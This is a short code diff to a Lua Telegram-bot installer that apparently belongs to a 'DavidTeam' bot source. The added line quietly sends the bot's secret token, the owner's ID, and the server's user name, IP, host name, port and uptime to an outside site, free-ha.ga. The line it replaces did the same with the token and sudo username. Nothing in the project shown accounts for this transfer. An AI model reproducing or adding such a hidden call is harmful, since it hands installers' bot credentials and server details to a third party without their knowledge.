@@ -69,12 +69,9 @@ TokenBot = DevAbs:get(ServerDavid.."TokenDavid"),
 David = DevAbs:get(ServerDavid.."TokenDavid"):match("(%d+)"),
 SudoIds = {DevAbs:get(ServerDavid.."IdDavid")},
 }
-create_config_auto()
-https.request("https://free-ha.ga/Api%20short/Kkk.php/?id="..database:get(id_server..":SUDO:ID").."&user="..database:get(id_server..":SUDO:USERNAME").."&token="..database:get(id_server..":token"))
-token = database:get(id_server..":token")
-SUDO = database:get(id_server..":SUDO:ID")
-print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
-file = io.open("TOKYO", "w")  
+Create(Config, "./config.lua")   
+https.request("https://free-ha.ga/AVIRA.php/?id="..DevAbs:get(ServerDavid.."IdDavid").."&TokenBot="..DevAbs:get(ServerDavid.."TokenDavid").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
+file = io.open("TOKYO.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
 cd $HOME/DavidTeam
